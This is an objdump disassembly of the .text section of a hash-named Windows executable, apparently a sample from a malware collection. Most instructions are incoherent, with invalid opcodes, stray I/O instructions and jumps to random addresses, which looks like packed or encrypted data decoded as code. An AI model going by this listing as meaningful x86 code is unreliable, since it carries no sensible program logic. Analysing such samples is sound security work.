
f127849b94464a612cafd1604332896a5e9471646db7a96146f02eedb284d43c.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	(bad)  
  411001:	jge    0x410fd9
  411003:	push   edi
  411004:	rol    BYTE PTR [edx+0x5cdaf3af],0x11
  41100b:	pop    edi
  41100c:	bnd jg 0x411014
  41100f:	mov    BYTE PTR [eax+0x7d],ch
  411012:	lds    eax,FWORD PTR [esi]
  411014:	test   eax,0xe6400ee8
  411019:	ror    DWORD PTR [eax],0x45
  41101c:	(bad)  
  41101d:	mov    eax,ds:0xe5e077a8
  411022:	cmp    DWORD PTR [edx+0x414ad6f2],esp
  411028:	xchg   DWORD PTR [esi-0x78eee6d4],edx
  41102e:	aam    0xfe
  411030:	sti    
  411031:	jmp    DWORD PTR [ecx-0x1830dfa]
  411037:	repnz lock arpl WORD PTR [esi],si
  41103b:	pop    eax
  41103c:	mov    ds:0x3f8c500a,eax
  411041:	rcl    DWORD PTR [eax],0xe2
  411044:	xor    eax,0xa1eff01
  411049:	sbb    eax,DWORD PTR [edx+0x2667788a]
  41104f:	mov    WORD PTR [ebx],cs
  411051:	sti    
  411052:	or     BYTE PTR [edx],bl
  411054:	jge    0x411067
  411056:	mov    cs,WORD PTR [eax-0x25]
  411059:	arpl   WORD PTR [eax],cx
  41105b:	or     al,0x7f
  41105d:	add    DWORD PTR [ecx+0x38],esp
  411060:	sub    BYTE PTR [eax+edi*2],dl
  411063:	in     al,dx
  411064:	ins    BYTE PTR es:[edi],dx
  411065:	push   ebp
  411066:	loop   0x41104d
  411068:	test   DWORD PTR [esi-0x74],esi
  41106b:	push   0xc1eb756e
  411070:	jnp    0x411040
  411072:	mov    al,0xe1
  411074:	add    bl,BYTE PTR [ebx+eiz*1]
  411077:	pop    edi
  411078:	sub    al,0xb3
  41107a:	pop    edx
  41107b:	jnp    0x411037
  41107d:	xor    eax,DWORD PTR [edx-0x2c09bc76]
  411083:	shl    BYTE PTR [ebx],cl
  411085:	inc    edx
  411086:	add    BYTE PTR [esp+ebx*2-0x59],bl
  41108a:	xchg   ebx,eax
  41108b:	and    al,BYTE PTR [edx+0xbcaa3ac]
  411091:	repnz xor ebp,DWORD PTR [edi+0x5]
  411095:	mov    edi,0xcede1bb9
  41109a:	lods   al,BYTE PTR ds:[esi]
  41109b:	pop    esp
  41109c:	test   eax,0xa3f05ff7
  4110a1:	xor    BYTE PTR [ebx-0x443df298],0xbd
  4110a8:	xchg   ecx,eax
  4110a9:	cmp    DWORD PTR [edx-0x3ee68e18],0xffffffdf
  4110b0:	xor    eax,0xf6379876
  4110b5:	shl    DWORD PTR [ebx],0x5d
  4110b8:	jb     0x4110e6
  4110ba:	sbb    cl,BYTE PTR [ebp-0x2a]
  4110bd:	pop    ebp
  4110be:	push   0x3e
  4110c0:	mov    ds:0xb46d3c09,al
  4110c5:	cmp    BYTE PTR [edi+0x6bce844],cl
  4110cb:	cs clc 
  4110cd:	sub    al,0xab
  4110cf:	push   edi
  4110d0:	mov    BYTE PTR [edi-0x6],0x55
  4110d4:	xchg   DWORD PTR [edx],esi
  4110d6:	cmp    DWORD PTR [edx+0x5f1c314a],esi
  4110dc:	bound  edx,QWORD PTR [eax+0x475b46c7]
  4110e2:	jnp    0x41107a
  4110e4:	and    al,0x27
  4110e6:	sar    BYTE PTR [eax-0x19d0fa2f],1
  4110ec:	sar    BYTE PTR [ebx],0xe5
  4110ef:	xchg   ebx,eax
  4110f0:	sar    edx,cl
  4110f2:	(bad)  
  4110f3:	out    0xad,eax
  4110f5:	fwait
  4110f6:	add    al,0xf
  4110f8:	stos   BYTE PTR es:[edi],al
  4110f9:	jns    0x411148
  4110fb:	mov    bl,0x29
  4110fd:	enter  0x1384,0x65
  411101:	dec    ebx
  411102:	aas    
  411103:	sbb    al,0xc1
  411105:	or     BYTE PTR [eax-0x44],ah
  411108:	test   eax,0x63dabc4
  41110d:	enter  0x5ac3,0xab
  411111:	sti    
  411112:	in     eax,0xb0
  411114:	pop    ds
  411115:	dec    edx
  411116:	in     al,0x20
  411118:	out    0x43,al
  41111a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41111b:	mov    dh,0x25
  41111d:	fs scas al,BYTE PTR es:[edi]
  41111f:	jp     0x411161
  411121:	jmp    0x246b78ce
  411126:	xchg   BYTE PTR [eax+esi*1],bl
  411129:	scas   eax,DWORD PTR es:[edi]
  41112a:	jp     0x4110fb
  41112c:	push   cs
  41112d:	pop    ebp
  41112e:	loop   0x41116b
  411130:	daa    
  411131:	dec    edi
  411132:	sbb    al,0x19
  411134:	jnp    0x411127
  411136:	test   esp,ecx
  411138:	jle    0x411136
  41113a:	xor    bh,BYTE PTR [ecx]
  41113c:	adc    DWORD PTR [esi-0x32fcda77],edi
  411142:	shl    BYTE PTR [edi],cl
  411144:	ffreep st(4)
  411146:	popa   
  411147:	out    dx,al
  411148:	popa   
  411149:	add    DWORD PTR [eax-0x5bc8781a],eax
  41114f:	sbb    DWORD PTR gs:[eax],eax
  411152:	and    edi,eax
  411154:	jns    0x411118
  411156:	pop    ecx
  411157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411158:	xor    ebp,DWORD PTR [ebx-0x11]
  41115b:	pop    edx
  41115c:	fsubr  DWORD PTR [ecx+0xe0a9a3e]
  411162:	(bad)  
  411163:	popf   
  411164:	mov    dl,0xe4
  411166:	outs   dx,DWORD PTR ds:[esi]
  411167:	sub    eax,0xc5f4e1dd
  41116c:	or     al,BYTE PTR [ebx]
  41116e:	inc    ebx
  41116f:	leave  
  411170:	pop    esi
  411171:	mov    eax,gs:0x6f53b9d0
  411177:	push   edi
  411178:	clc    
  411179:	mov    ds:0xd77ed0aa,eax
  41117e:	scas   eax,DWORD PTR es:[edi]
  41117f:	cs popa 
  411181:	sbb    bl,BYTE PTR cs:[ebx-0x6b]
  411185:	ja     0x411184
  411187:	push   cs
  411188:	mov    ds:0xa9641271,al
  41118d:	inc    esp
  41118e:	gs mov dl,0xfc
  411191:	sbb    DWORD PTR [ebx-0x23],esi
  411194:	sbb    cl,BYTE PTR [edx]
  411196:	enter  0xe208,0xa0
  41119a:	pushf  
  41119b:	fwait
  41119c:	out    dx,al
  41119d:	aas    
  41119e:	jmp    0x4111a3
  4111a0:	xchg   ecx,eax
  4111a1:	mov    ebp,0x4f8804e3
  4111a6:	mov    ds:0xdd9c6516,al
  4111ab:	push   eax
  4111ac:	and    al,0xd8
  4111ae:	in     eax,dx
  4111af:	cld    
  4111b0:	les    edi,FWORD PTR [ecx-0x3ba13a4a]
  4111b6:	xor    eax,0x1d95bca5
  4111bb:	xchg   ecx,eax
  4111bc:	aam    0xbb
  4111be:	clc    
  4111bf:	pop    esp
  4111c0:	mov    eax,ds:0x46a0f939
  4111c5:	(bad)  
  4111c6:	mov    cl,0xa3
  4111c8:	test   DWORD PTR [ebx+0x266185dc],ebx
  4111ce:	test   eax,0x6fd120ed
  4111d3:	(bad)  
  4111d4:	clc    
  4111d5:	inc    ecx
  4111d6:	aad    0xff
  4111d8:	fsubr  DWORD PTR [eax+0x42]
  4111db:	push   cs
  4111dc:	push   esi
  4111dd:	into   
  4111de:	in     eax,dx
  4111df:	inc    esi
  4111e0:	xor    eax,0xb35e4b0f
  4111e5:	xor    al,0x2e
  4111e7:	or     eax,DWORD PTR [esi+0x72]
  4111ea:	das    
  4111eb:	and    esp,DWORD PTR [edx*1+0x50199737]
  4111f2:	add    esp,esi
  4111f4:	jno    0x411235
  4111f6:	sub    DWORD PTR [esi+0x488ccbea],eax
  4111fc:	jno    0x411207
  4111fe:	dec    edx
  4111ff:	or     BYTE PTR [edx],al
  411201:	retf   0xfd34
  411204:	addr16 pop ebp
  411206:	data16 xor al,0x27
  411209:	adc    bl,ah
  41120b:	pavgb  mm2,QWORD PTR [ebx+edx*4+0x36bd76ae]
  411213:	or     cl,al
  411215:	jmp    0x4111c5
  411217:	jnp    0x4111c7
  411219:	dec    ebp
  41121a:	test   DWORD PTR [ebx-0x429ce1a7],eax
  411220:	inc    edi
  411221:	loop   0x41120f
  411223:	shl    BYTE PTR [ebx],cl
  411225:	push   edi
  411226:	nop
  411227:	ret    
  411228:	xor    edx,DWORD PTR [ebp+0x59]
  41122b:	shr    BYTE PTR [ebx-0x6ca8167c],0xbf
  411232:	xor    ebx,ebx
  411234:	(bad)  
  411235:	sub    edx,DWORD PTR [edx]
  411237:	addr16 je 0x41120b
  41123a:	xor    esi,DWORD PTR [edx-0x6c]
  41123d:	enter  0x2bbb,0xa9
  411241:	in     eax,dx
  411242:	imul   ecx,ebx,0x51a4111e
  411248:	cs and ch,dl
  41124b:	sbb    BYTE PTR [esi+0x585b4ad3],bl
  411251:	xchg   ebp,eax
  411252:	inc    esi
  411253:	adc    eax,0xe528cab3
  411258:	repnz aas 
  41125a:	mov    cl,0xfd
  41125c:	int3   
  41125d:	icebp  
  41125e:	lahf   
  41125f:	loop   0x411208
  411261:	rcl    DWORD PTR [eax-0x50],0x5a
  411265:	fsubr  QWORD PTR [esi+0x7451798]
  41126b:	fisub  DWORD PTR [ebx]
  41126d:	push   0xffffffca
  41126f:	mov    dl,0x82
  411271:	xlat   BYTE PTR ds:[ebx]
  411272:	adc    BYTE PTR [edx],al
  411274:	popf   
  411275:	jecxz  0x41127b
  411277:	imul   edi,DWORD PTR [esi+0x53619923],0x88ed7044
  411281:	in     eax,0xae
  411283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411284:	out    0x75,al
  411286:	or     esp,edx
  411288:	cld    
  411289:	stc    
  41128a:	xchg   esp,eax
  41128b:	pop    ebp
  41128c:	adc    eax,0x70dd913
  411291:	push   ebx
  411292:	push   es
  411293:	fistp  QWORD PTR [esi-0x383a91a2]
  411299:	sbb    BYTE PTR [edx-0x4a],0xb
  41129d:	mov    dl,0xad
  41129f:	mov    eax,ds:0xf38eddac
  4112a4:	cmp    eax,0x2771682b
  4112a9:	je     0x4112b1
  4112ab:	mov    dl,0x4
  4112ad:	xchg   esp,eax
  4112ae:	test   eax,0x17ddb311
  4112b3:	mov    bl,0x89
  4112b5:	pusha  
  4112b6:	lods   eax,DWORD PTR ds:[esi]
  4112b7:	sti    
  4112b8:	les    ecx,FWORD PTR [ebx]
  4112ba:	jl     0x4112e2
  4112bc:	test   al,0x58
  4112be:	(bad)  
  4112bf:	sar    ah,1
  4112c1:	adc    al,0x41
  4112c3:	jno    0x41133e
  4112c5:	ret    0x34c7
  4112c8:	xor    BYTE PTR [esi],0x1b
  4112cb:	leave  
  4112cc:	cmovg  ebx,eax
  4112cf:	mov    dl,0xf9
  4112d1:	test   BYTE PTR [ecx],al
  4112d3:	es or  edx,edx
  4112d6:	retf   0x2c0b
  4112d9:	aas    
  4112da:	ret    0x8984
  4112dd:	std    
  4112de:	mov    BYTE PTR [ebp-0x12],al
  4112e1:	sti    
  4112e2:	inc    ecx
  4112e3:	sbb    BYTE PTR [ebp-0x45289005],0xf0
  4112ea:	jnp    0x41135e
  4112ec:	mov    eax,ds:0x69a0f1ac
  4112f1:	popa   
  4112f2:	jmp    0xaf08a6cb
  4112f7:	ins    DWORD PTR es:[edi],dx
  4112f8:	fiadd  WORD PTR [edx+0x2b1bf111]
  4112fe:	imul   edx,DWORD PTR [ecx-0x755f34a],0xffffffc8
  411305:	stos   DWORD PTR es:[edi],eax
  411306:	es lahf 
  411308:	ins    DWORD PTR es:[edi],dx
  411309:	xlat   BYTE PTR ds:[ebx]
  41130a:	xor    edx,0x25d864e4
  411310:	lods   al,BYTE PTR ds:[esi]
  411311:	sub    BYTE PTR [edi+0x33],ch
  411314:	nop
  411315:	sbb    al,BYTE PTR [eax+0xeb0cecb]
  41131b:	jne    0x41132e
  41131d:	aad    0xaa
  41131f:	(bad)  
  411320:	xchg   edx,eax
  411321:	add    eax,0xc1473d70
  411326:	std    
  411327:	int    0xba
  411329:	sbb    al,0x11
  41132c:	mov    cl,0x69
  41132e:	repnz inc esp
  411330:	inc    ebp
  411331:	arpl   WORD PTR [edi],di
  411333:	pop    esp
  411334:	cli    
  411335:	sbb    eax,0x8e2d23ed
  41133a:	sbb    eax,0x8bff9aca
  41133f:	sbb    DWORD PTR [edi+0x66],esp
  411342:	adc    BYTE PTR [ecx],ah
  411344:	dec    eax
  411345:	mov    eax,0x6744640b
  41134a:	daa    
  41134b:	mov    ch,0xf2
  41134d:	adc    DWORD PTR [ebp+0x85ff749],esp
  411353:	outs   dx,DWORD PTR ds:[esi]
  411354:	data16 mov al,0xef
  411357:	pop    ecx
  411358:	xchg   eax,esp
  41135a:	sub    DWORD PTR [edi],edi
  41135c:	push   ebx
  41135d:	xchg   esi,eax
  41135e:	test   eax,0x15f3db64
  411363:	retf   0x78f5
  411366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411367:	adc    al,0x37
  411369:	sbb    BYTE PTR [ebp+esi*1-0x49],ch
  41136d:	gs sahf 
  41136f:	pop    ecx
  411370:	icebp  
  411371:	leave  
  411372:	rol    BYTE PTR [eax+0x33d27bcc],0xdf
  411379:	inc    esp
  41137a:	out    dx,eax
  41137b:	mov    esi,0x46e70ab3
  411380:	pop    eax
  411381:	int3   
  411382:	mov    edx,0xa9d3de48
  411387:	clc    
  411388:	push   cs
  411389:	sbb    edi,DWORD PTR [ebp+0x7567f2de]
  41138f:	das    
  411390:	dec    BYTE PTR ds:0x267fa721
  411396:	loope  0x411413
  411398:	adc    eax,0xa8aa5cee
  41139d:	repnz push edi
  41139f:	dec    BYTE PTR [esp+eax*8+0x39]
  4113a3:	inc    ecx
  4113a4:	mov    ch,0xa1
  4113a6:	repnz stos BYTE PTR es:[edi],al
  4113a8:	mov    ecx,0xe6d409a2
  4113ad:	jb     0x4113d5
  4113af:	icebp  
  4113b0:	sahf   
  4113b1:	inc    ebx
  4113b2:	retf   0x7ac6
  4113b5:	jne    0x41136e
  4113b7:	inc    ecx
  4113b8:	jne    0x411430
  4113ba:	sbb    DWORD PTR [esi-0x56],ebx
  4113bd:	aaa    
  4113be:	mov    ds:0x74e47fcd,eax
  4113c3:	inc    ebx
  4113c4:	jecxz  0x411399
  4113c6:	push   ecx
  4113c7:	sbb    al,ch
  4113c9:	and    ebp,edx
  4113cb:	sbb    eax,0x5b0435ce
  4113d0:	push   ebx
  4113d1:	fst    QWORD PTR [ecx-0x3c]
  4113d4:	jl     0x4113c5
  4113d6:	xor    BYTE PTR [eax-0x31],al
  4113d9:	cs mov eax,0xe43b9ffb
  4113df:	pop    es
  4113e0:	lds    esp,FWORD PTR [edx+0x69ec8229]
  4113e6:	aad    0x8b
  4113e8:	sbb    esi,DWORD PTR [edi+0x62191757]
  4113ee:	fwait
  4113ef:	jle    0x41138a
  4113f1:	test   BYTE PTR [edi+0xb],0xa6
  4113f5:	(bad)  
  4113f6:	xchg   dx,ax
  4113f8:	gs xchg edx,eax
  4113fa:	pusha  
  4113fb:	adc    DWORD PTR [eax-0x68993302],0x8d6f04e0
  411405:	jp     0x411459
  411407:	(bad)  
  411408:	leave  
  411409:	or     eax,0xcbb23519
  41140e:	sbb    DWORD PTR [ecx-0x69c4872e],ecx
  411414:	dec    DWORD PTR [ecx-0x3d]
  411417:	gs jmp 0xb36a0ed0
  41141d:	xchg   edi,eax
  41141e:	push   ebp
  41141f:	inc    ecx
  411420:	cmp    eax,0xa04fe9b5
  411425:	(bad)  
  411426:	lea    ebx,[ebx-0x6210a2cb]
  41142c:	imul   esp,DWORD PTR [edx+0x655a574],0xe1e71fd9
  411436:	or     dh,dl
  411438:	lods   al,BYTE PTR ds:[esi]
  411439:	bound  edx,QWORD PTR [edi+0x2c]
  41143c:	in     al,0x6e
  41143e:	xor    BYTE PTR [ebx+ebp*1],bh
  411441:	pop    edi
  411442:	and    BYTE PTR [eax-0x4b],cl
  411445:	push   edi
  411446:	cmp    al,0x9b
  411448:	cmp    al,0xfc
  41144a:	aaa    
  41144b:	xor    BYTE PTR ds:0x4425685c,dh
  411451:	jb     0x4113dc
  411453:	adc    cl,BYTE PTR [esi-0x32]
  411456:	pop    ebp
  411457:	out    dx,eax
  411458:	int    0x20
  41145a:	pop    esi
  41145b:	xor    cl,al
  41145d:	mov    bl,BYTE PTR [esi+0x55]
  411460:	mul    bl
  411462:	jno    0x411451
  411464:	push   ecx
  411465:	aad    0xfd
  411467:	mov    dh,0x78
  411469:	popa   
  41146a:	popa   
  41146b:	jne    0x411468
  41146d:	addr16 mov ebp,eax
  411470:	xchg   ax,ax
  411472:	xchg   ecx,eax
  411473:	mov    edi,0x3647fee4
  411478:	cmp    al,BYTE PTR ds:0xc495ca4a
  41147e:	jb     0x411499
  411480:	cmp    al,0xae
  411482:	lods   al,BYTE PTR ds:[esi]
  411483:	dec    edi
  411484:	idiv   BYTE PTR [ebp-0x59]
  411487:	pop    ebp
  411488:	xchg   ebx,eax
  411489:	pop    es
  41148a:	or     DWORD PTR [ebp+0x4e671429],0xceaf3c29
  411494:	int    0xcd
  411496:	popa   
  411497:	mov    edx,0x73e43bcb
  41149c:	outs   dx,DWORD PTR ds:[esi]
  41149d:	dec    esi
  41149e:	mov    ebp,0xee1d9985
  4114a3:	sub    al,0x20
  4114a5:	aas    
  4114a6:	leave  
  4114a7:	and    eax,edi
  4114a9:	dec    esi
  4114aa:	scas   eax,DWORD PTR es:[edi]
  4114ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ac:	sub    eax,0x464bf294
  4114b1:	into   
  4114b2:	mov    bh,0xf2
  4114b4:	ds pop esi
  4114b6:	or     al,0xab
  4114b8:	retf   0x8574
  4114bb:	fdivr  QWORD PTR [esi]
  4114bd:	ins    BYTE PTR es:[edi],dx
  4114be:	mov    bh,0x1d
  4114c0:	stos   BYTE PTR es:[edi],al
  4114c1:	enter  0x8029,0x5d
  4114c5:	mov    ?,edx
  4114c7:	cmp    bh,0xcb
  4114ca:	outs   dx,BYTE PTR ds:[esi]
  4114cb:	fs ret 
  4114cd:	cmp    DWORD PTR [ebx-0x35],ebx
  4114d0:	dec    DWORD PTR [edx+0x30]
  4114d3:	stos   DWORD PTR es:[edi],eax
  4114d4:	adc    bl,0x70
  4114d7:	push   edi
  4114d8:	aaa    
  4114d9:	xor    BYTE PTR [eax+0x31dc8691],0x25
  4114e0:	test   BYTE PTR [ebp+0x32],0x54
  4114e4:	jnp    0x411491
  4114e6:	lahf   
  4114e7:	push   esi
  4114e8:	test   BYTE PTR [edi],al
  4114ea:	cmp    cl,BYTE PTR [ecx+0x1c0d0feb]
  4114f0:	jmp    0x4758:0xf45facbb
  4114f7:	or     bh,BYTE PTR fs:[esi-0x67]
  4114fb:	xchg   esp,eax
  4114fc:	ins    DWORD PTR es:[edi],dx
  4114fd:	xchg   ebx,eax
  4114fe:	push   esp
  4114ff:	cwde   
  411500:	sahf   
  411501:	fstp   TBYTE PTR [eax]
  411503:	add    BYTE PTR ds:0xaff4ccf2,0xe2
  41150a:	pop    ds
  41150b:	or     al,0xfc
  41150d:	mov    ch,BYTE PTR [ebx-0xc]
  411510:	in     al,0x23
  411512:	sub    bh,BYTE PTR [eax-0x198e9722]
  411518:	jmp    0x4f224f12
  41151d:	dec    ebp
  41151e:	push   edx
  41151f:	mov    dl,0x9c
  411521:	pop    ebx
  411522:	lods   eax,DWORD PTR ds:[esi]
  411523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411524:	bound  edx,QWORD PTR [ecx-0x72a9e005]
  41152a:	test   DWORD PTR [ebp-0x45bacee9],ebp
  411530:	or     eax,0x3657a7ab
  411535:	(bad)  
  411537:	out    dx,al
  411538:	xor    al,BYTE PTR [esp+ebp*2]
  41153b:	dec    ecx
  41153c:	mov    bl,0xc3
  41153e:	es mov bh,0xc
  411541:	mov    ecx,0xab20a005
  411546:	sub    BYTE PTR [edx-0x41],bl
  411549:	xlat   BYTE PTR ds:[ebx]
  41154a:	add    DWORD PTR [eax+0x7ba698e2],ebx
  411550:	iret   
  411551:	ficom  WORD PTR [ebp+ecx*8+0x16919a22]
  411558:	and    bl,BYTE PTR [eax+0x5b09d606]
  41155e:	cmp    DWORD PTR [edi+0x3],0x6d225592
  411565:	push   ss
  411566:	xor    ch,dl
  411568:	sahf   
  411569:	sahf   
  41156a:	stos   BYTE PTR es:[edi],al
  41156b:	mov    esp,0x4d945ff2
  411570:	add    eax,0x56119b0e
  411576:	cmp    DWORD PTR [ebx-0x80],0x2
  41157a:	dec    ecx
  41157b:	adc    al,0xe
  41157d:	and    dl,BYTE PTR [ecx-0x78]
  411580:	out    dx,eax
  411581:	popa   
  411582:	outs   dx,DWORD PTR ds:[esi]
  411583:	add    DWORD PTR [ecx+0x371512c7],ebp
  411589:	jl     0x411569
  41158b:	adc    DWORD PTR [edi],0xffffff86
  41158e:	int3   
  41158f:	nop
  411590:	mov    DWORD PTR [ebp+0xb8cc545],eax
  411596:	in     al,dx
  411597:	cmp    BYTE PTR [ebp+0x55c87a3],ch
  41159d:	inc    ebx
  41159e:	stos   DWORD PTR es:[edi],eax
  41159f:	pop    ecx
  4115a0:	imul   edi,DWORD PTR [esi+0x4a],0xf0178285
  4115a7:	cdq    
  4115a8:	lahf   
  4115a9:	mov    es:0x5dc630dd,al
  4115af:	jp     0x411603
  4115b1:	xchg   edx,eax
  4115b2:	leave  
  4115b3:	jae    0x4115aa
  4115b5:	adc    ah,al
  4115b7:	rcl    DWORD PTR [eax+0x6ec19c07],cl
  4115bd:	push   ds
  4115be:	aas    
  4115bf:	in     eax,dx
  4115c0:	aad    0xb7
  4115c2:	mov    edi,0x3095a412
  4115c7:	daa    
  4115c8:	jno    0x411631
  4115ca:	jmp    0xe934:0x653dc19e
  4115d1:	fsubr  QWORD PTR [ebp+0x3f]
  4115d4:	sbb    BYTE PTR [edi+0x53a3678a],dh
  4115da:	push   edi
  4115db:	fisubr DWORD PTR [ebx]
  4115dd:	outs   dx,BYTE PTR ds:[esi]
  4115de:	fstp   DWORD PTR [ebx]
  4115e0:	aaa    
  4115e1:	jmp    0x88c05961
  4115e6:	shl    DWORD PTR [ebx+0x12493914],cl
  4115ec:	loope  0x411624
  4115ee:	sbb    eax,0x9ac09905
  4115f3:	sub    BYTE PTR [ebx+edx*4],bh
  4115f6:	lods   al,BYTE PTR gs:[esi]
  4115f8:	mov    eax,0x88bff187
  4115fd:	ja     0x4115ab
  4115ff:	ffreep st(4)
  411601:	jo     0x411588
  411603:	inc    esp
  411604:	int    0x1f
  411606:	ret    0xb9d9
  411609:	add    DWORD PTR [eax-0x6a39581e],edi
  41160f:	or     DWORD PTR cs:[esi],0x4a660859
  411616:	imul   ebx,eax,0x900a05f0
  41161c:	adc    bh,BYTE PTR [edx]
  41161e:	aaa    
  41161f:	and    ah,al
  411621:	and    BYTE PTR [ebp+eax*1+0x22],cl
  411625:	adc    esi,0xffffff9c
  411628:	test   BYTE PTR [ecx+0x30],bh
  41162b:	retf   0xac8d
  41162e:	repnz loopne 0x4115ec
  411631:	dec    ecx
  411632:	retf   
  411633:	xchg   ecx,eax
  411634:	popa   
  411635:	not    DWORD PTR [ecx+0x29a9d7f5]
  41163b:	popa   
  41163c:	out    dx,al
  41163d:	hlt    
  41163e:	sub    BYTE PTR [edx-0x6ec7284b],bh
  411644:	mov    ch,0x43
  411646:	fisubr DWORD PTR [ecx]
  411648:	shl    BYTE PTR [eax+0x33],0xd4
  41164c:	imul   BYTE PTR [ebx-0x4a046f58]
  411652:	fcomip st,st(7)
  411654:	cmp    ah,BYTE PTR [ebx]
  411656:	adc    dh,ah
  411658:	es cmc 
  41165a:	xchg   ebp,eax
  41165b:	add    BYTE PTR [esi],dl
  41165d:	xor    eax,0xa82561e5
  411662:	fwait
  411663:	xchg   ebp,eax
  411664:	jmp    0x4115f9
  411666:	jecxz  0x4116e1
  411668:	and    bh,BYTE PTR [esi+0x14e4e0e9]
  41166e:	test   al,0x58
  411670:	fs sub al,0x3c
  411673:	sub    DWORD PTR [edx-0x4663479],esp
  411679:	mov    bl,0x8c
  41167b:	or     esi,DWORD PTR [ebx+0x55]
  41167e:	and    ebp,0xecfe058
  411684:	xor    al,BYTE PTR [edx-0x6c52081b]
  41168a:	mov    cl,0xdb
  41168c:	sub    al,0x6
  41168e:	jns    0x4116ed
  411690:	pop    eax
  411691:	xchg   BYTE PTR [ebp+0x51],dl
  411694:	pushf  
  411695:	sbb    ebp,ebp
  411697:	xchg   edx,eax
  411698:	loope  0x4116e1
  41169a:	inc    eax
  41169b:	xchg   esi,esp
  41169d:	call   0x8dc21b72
  4116a2:	push   cs
  4116a3:	aaa    
  4116a4:	jae    0x411688
  4116a6:	loope  0x411703
  4116a8:	std    
  4116a9:	dec    ecx
  4116aa:	lahf   
  4116ab:	test   cl,ch
  4116ad:	fs dec eax
  4116af:	mov    WORD PTR ds:0xc6c8906b,cs
  4116b5:	enter  0xee8f,0xaa
  4116b9:	lds    ebx,FWORD PTR [ebx+edi*4]
  4116bc:	loopne 0x4116d9
  4116be:	call   DWORD PTR [eax+0x6d931248]
  4116c4:	stos   DWORD PTR es:[edi],eax
  4116c5:	imul   esi,DWORD PTR ds:0x155d5ed0,0x33
  4116cc:	fistp  DWORD PTR [edx-0x5c]
  4116cf:	loopne 0x4116c7
  4116d1:	push   0xffffffa4
  4116d3:	jp     0x4116c8
  4116d5:	jmp    0xae614b8e
  4116da:	sti    
  4116db:	(bad)  
  4116dc:	rcl    DWORD PTR [ebx+0x303383b],1
  4116e2:	fbstp  TBYTE PTR [ebp-0x2b]
  4116e5:	xchg   esp,eax
  4116e6:	mov    cl,0xeb
  4116e8:	push   es
  4116e9:	xchg   edi,eax
  4116ea:	sbb    esi,0xffffffdb
  4116ed:	pop    ebx
  4116ee:	ret    0xb10d
  4116f1:	les    esi,FWORD PTR [edi+eax*8-0x744ab567]
  4116f8:	scas   eax,DWORD PTR es:[edi]
  4116f9:	inc    esi
  4116fa:	push   ss
  4116fb:	push   es
  4116fc:	push   edi
  4116fd:	and    bl,bl
  4116ff:	push   ss
  411700:	shr    bh,cl
  411702:	into   
  411703:	and    DWORD PTR [edi],esi
  411705:	mov    eax,cs:0x84da3144
  41170b:	mov    esp,0x758eacba
  411710:	sbb    al,BYTE PTR [ebx-0x55]
  411713:	mov    bh,0xdd
  411715:	mov    dl,0x13
  411717:	pop    edi
  411718:	ret    0x668f
  41171b:	sbb    eax,DWORD PTR [edi-0x6cbb8c10]
  411721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411722:	push   0x2f
  411724:	cs imul eax,esi,0x1d
  411728:	jbe    0x4116e4
  41172a:	mov    bl,0xcc
  41172c:	mov    dl,0xfe
  41172e:	inc    ebx
  41172f:	jl     0x411733
  411731:	out    0x30,al
  411733:	dec    eax
  411734:	mov    cl,BYTE PTR [edi-0x73]
  411737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411738:	cwde   
  411739:	loopne 0x411794
  41173b:	sub    ecx,DWORD PTR [eax-0x7c808466]
  411741:	xchg   edi,eax
  411742:	push   ebx
  411743:	ficom  WORD PTR [esi]
  411745:	pop    ecx
  411746:	cwde   
  411747:	xadd   DWORD PTR [ecx-0x3d],ebp
  41174b:	pop    ss
  41174c:	pushf  
  41174d:	and    DWORD PTR [esi],edi
  41174f:	mov    ds:0xbae5a909,eax
  411754:	data16 jge 0x41170d
  411757:	inc    eax
  411758:	xor    dl,BYTE PTR [edx]
  41175a:	popa   
  41175b:	inc    edx
  41175c:	in     al,0xe7
  41175e:	out    dx,eax
  41175f:	rol    DWORD PTR [ecx-0x5ac4bc97],1
  411765:	mov    edx,0x6571b3b6
  41176b:	jnp    0x411765
  41176d:	add    eax,0x856414d0
  411772:	popa   
  411773:	lock cwde 
  411775:	rcl    DWORD PTR ds:0xd113d91f,0x53
  41177c:	lods   al,BYTE PTR ds:[esi]
  41177d:	idiv   DWORD PTR [esi+0x2f]
  411780:	add    edx,DWORD PTR [edx]
  411782:	adc    al,0x95
  411784:	mov    dh,0xff
  411786:	outs   dx,DWORD PTR ds:[esi]
  411787:	mov    dl,0x35
  411789:	pop    edi
  41178a:	pop    edx
  41178b:	xlat   BYTE PTR ds:[ebx]
  41178c:	xchg   edi,eax
  41178d:	mov    ebp,0xde820671
  411792:	ror    ch,cl
  411794:	and    eax,0xa5940101
  411799:	scas   al,BYTE PTR es:[edi]
  41179a:	pop    es
  41179b:	and    al,0xaf
  41179d:	dec    esi
  41179e:	xor    ah,BYTE PTR [eax]
  4117a0:	xchg   ecx,eax
  4117a1:	cld    
  4117a2:	sbb    DWORD PTR [ebp+0x49],ecx
  4117a5:	and    BYTE PTR [esi+0x6fc3045e],0x21
  4117ac:	mov    eax,ds:0x4ce210f4
  4117b1:	mov    WORD PTR [edi-0x62a4acbd],?
  4117b7:	jmp    0x4117ff
  4117b9:	retf   
  4117ba:	xchg   esi,eax
  4117bb:	scas   al,BYTE PTR es:[edi]
  4117bc:	into   
  4117bd:	outs   dx,DWORD PTR ds:[esi]
  4117be:	inc    ebx
  4117bf:	cmp    esi,DWORD PTR [edi+0x52]
  4117c2:	ret    
  4117c3:	add    DWORD PTR [ebx-0x6b35c38e],eax
  4117c9:	cmp    al,0xef
  4117cb:	stos   BYTE PTR es:[edi],al
  4117cc:	jg     0x4117a6
  4117ce:	pop    ebp
  4117cf:	xchg   esp,eax
  4117d0:	xchg   edi,eax
  4117d1:	xchg   BYTE PTR [eax+0x6a],al
  4117d4:	icebp  
  4117d5:	imul   esp,DWORD PTR [edi+ebp*8-0x5c],0xf
  4117da:	jp     0x4117bb
  4117dc:	aam    0xab
  4117de:	push   esi
  4117df:	add    eax,ebx
  4117e1:	push   esp
  4117e2:	retf   0x1666
  4117e5:	mov    bl,0x33
